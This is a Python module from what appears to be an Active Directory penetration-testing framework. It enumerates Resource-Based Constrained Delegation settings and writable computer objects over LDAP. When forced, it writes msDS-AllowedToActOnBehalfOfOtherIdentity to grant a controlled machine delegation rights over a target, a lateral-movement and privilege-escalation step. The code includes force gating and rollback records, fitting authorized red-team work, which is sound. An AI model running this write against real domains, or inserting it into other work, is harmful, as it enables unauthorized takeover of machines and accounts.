"""Resource-Based Constrained Delegation (RBCD) enum + optional set.

Enumerates msDS-AllowedToActOnBehalfOfOtherIdentity on computer objects.
Write (set RBCD) requires --force.
"""

from __future__ import annotations

import json
from typing import Any

from ldap3 import LEVEL, SUBTREE
from rich.console import Console

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

ATTR = "msDS-AllowedToActOnBehalfOfOtherIdentity"


def _parse_security_descriptor_sids(raw: Any) -> list[str]:
    """Best-effort extract of SIDs from a security descriptor blob / string."""
    sids: list[str] = []
    if raw is None:
        return sids
    try:
        if isinstance(raw, bytes):
            # Scan for S-1-5-... ASCII fragments in binary SD
            text = raw.decode("latin-1", errors="ignore")
        else:
            text = str(raw)
        import re

        sids = re.findall(r"S-1-5-\d+(?:-\d+)+", text)
    except Exception:  # noqa: BLE001
        pass
    return list(dict.fromkeys(sids))


@register_capability(
    id="rbcd",
    summary="Enumerate RBCD (AllowedToAct); optional set requires --force",
    category="lateral-movement",
    tags=("rbcd", "delegation", "msDS-AllowedToActOnBehalfOfOtherIdentity"),
    destructive=True,
)
class Rbcd:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        set_on = kwargs.get("set_on") or kwargs.get("computer")  # target computer SAM
        set_from = kwargs.get("set_from")  # controlled computer SAM/SID to grant

        console.print(f"[bold]RBCD[/bold] → {target.domain} @ {target.dc_ip}")
        conn, base_dn, _cfg = ldap_connect(target)

        result: dict[str, Any] = {
            "domain": target.domain,
            "rbcd_configured": [],
            "writable_computers": [],
            "set_attempt": None,
        }

        # Computers with RBCD already configured
        conn.search(
            base_dn,
            f"(&(objectClass=computer)({ATTR}=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName", ATTR, "dNSHostName"],
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            raw = entry[ATTR].value if entry[ATTR] else None
            sids = _parse_security_descriptor_sids(raw)
            item = {
                "sam": sam,
                "dn": str(entry.distinguishedName),
                "dns": str(entry.dNSHostName) if entry.dNSHostName else None,
                "allowed_to_act_sids": sids,
            }
            result["rbcd_configured"].append(item)
            comp_id = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(comp_id, "Computer", sam=sam, dn=item["dn"], rbcd=True)
            for sid in sids:
                src = f"SID@{sid}"
                graph.add_node(src, "Base", sid=sid)
                graph.add_edge(src, comp_id, "AllowedToAct", via="RBCD")
            console.print(f"  [cyan]{sam}[/cyan]  allowed_sids={len(sids)}")

        # Computers where we may write AllowedToAct (GenericAll/WriteProperty/WriteDacl)
        conn.search(
            base_dn,
            "(objectClass=computer)",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName"],
            size_limit=int(kwargs.get("max_objects") or 500),
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            dn = str(entry.distinguishedName)
            if not sam:
                continue
            sd = fetch_sd(conn, dn)
            if not sd:
                continue
            try:
                for ace in parse_interesting_aces(sd):
                    if ace.right in (
                        "GenericAll",
                        "GenericWrite",
                        "WriteProperty",
                        "WriteDacl",
                        "WriteOwner",
                    ):
                        result["writable_computers"].append(
                            {
                                "computer": sam,
                                "dn": dn,
                                "principal_sid": ace.principal_sid,
                                "right": ace.right,
                            }
                        )
                        src = f"SID@{ace.principal_sid}"
                        tgt = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
                        graph.add_node(src, "Base", sid=ace.principal_sid)
                        graph.add_node(tgt, "Computer", sam=sam, dn=dn)
                        graph.add_edge(src, tgt, "WriteRBCD", right=ace.right)
            except Exception:  # noqa: BLE001
                pass

        # De-dupe writable list for console summary
        uniq = {
            (w["computer"], w["principal_sid"], w["right"]) for w in result["writable_computers"]
        }
        console.print(f"  Writable RBCD surfaces: [cyan]{len(uniq)}[/cyan] ACE hits")

        if set_on:
            if not force:
                console.print("[yellow]RBCD set requested without --force — enum only.[/yellow]")
                result["set_attempt"] = {"set_on": set_on, "skipped": "force_required"}
            elif not set_from:
                result["set_attempt"] = {
                    "set_on": set_on,
                    "ok": False,
                    "error": "set_from (controlled computer SAM) required",
                }
            else:
                result["set_attempt"] = self._set_rbcd(conn, base_dn, set_on, set_from)
                if result["set_attempt"].get("ok"):
                    session.register_cleanup(
                        {
                            "kind": "rbcd",
                            "target": result["set_attempt"].get("set_on_dn"),
                            "previous": result["set_attempt"].get("previous", []),
                            "rollback": "Restore the recorded msDS-AllowedToActOnBehalfOfOtherIdentity value.",
                        }
                    )

        conn.unbind()
        out_path = session.path("rbcd.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "rbcd.complete",
            configured=len(result["rbcd_configured"]),
            writable=len(uniq),
        )
        console.print(
            f"[green]Done[/green]  configured={len(result['rbcd_configured'])}  "
            f"writable_aces={len(result['writable_computers'])}"
        )
        console.print(f"Results → {out_path}")
        return result

    def _set_rbcd(self, conn: Any, base_dn: str, set_on: str, set_from: str) -> dict[str, Any]:
        """Set msDS-AllowedToActOnBehalfOfOtherIdentity using an in-process SD."""
        from ldap3 import MODIFY_REPLACE

        from adaf_attack.core.rbcd_sd import build_allowed_to_act_sd, sid_from_ldap_value

        console.print(f"[red]SET RBCD[/red]  {set_from} → AllowedToAct on {set_on}")

        def _lookup(sam: str) -> tuple[str | None, str | None]:
            conn.search(
                base_dn,
                f"(sAMAccountName={sam})",
                search_scope=SUBTREE,
                attributes=["distinguishedName", "objectSid", ATTR],
            )
            if not conn.entries:
                return None, None
            e = conn.entries[0]
            dn = str(e.distinguishedName)
            sid = sid_from_ldap_value(e.objectSid.value if e.objectSid else None)
            return dn, sid

        candidates_on = [set_on, set_on if set_on.endswith("$") else set_on + "$"]
        candidates_from = [set_from, set_from if set_from.endswith("$") else set_from + "$"]
        on_dn = on_sid = from_dn = from_sid = None
        for c in candidates_on:
            on_dn, on_sid = _lookup(c)
            if on_dn:
                break
        for c in candidates_from:
            from_dn, from_sid = _lookup(c)
            if from_sid:
                break

        if not on_dn or not from_sid:
            return {
                "ok": False,
                "set_on": set_on,
                "set_from": set_from,
                "error": f"lookup failed on_dn={on_dn} from_sid={from_sid}",
            }

        try:
            conn.search(on_dn, "(objectClass=*)", search_scope=LEVEL, attributes=[ATTR])
            previous = (
                list(conn.entries[0][ATTR].raw_values)
                if conn.entries and conn.entries[0][ATTR]
                else []
            )
            sd_bytes = build_allowed_to_act_sd(from_sid)
            ok = conn.modify(on_dn, {ATTR: [(MODIFY_REPLACE, [sd_bytes])]})
            result = {
                "ok": bool(ok),
                "ldap_written": bool(ok),
                "ldap_result": str(conn.result),
                "set_on": set_on,
                "set_on_dn": on_dn,
                "set_from": set_from,
                "set_from_sid": from_sid,
                "sd_len": len(sd_bytes),
                "previous": [
                    value.hex() if isinstance(value, bytes) else str(value) for value in previous
                ],
            }
            if ok:
                console.print(f"  [green]LDAP REPLACE ok[/green]  {ATTR} on {on_dn}")
                console.print(f"  allowed SID: {from_sid}")
            else:
                console.print(f"  [red]LDAP modify failed[/red]: {conn.result}")
            return result
        except Exception as exc:  # noqa: BLE001
            return {
                "ok": False,
                "set_on": set_on,
                "set_from": set_from,
                "set_from_sid": from_sid,
                "error": str(exc),
            }
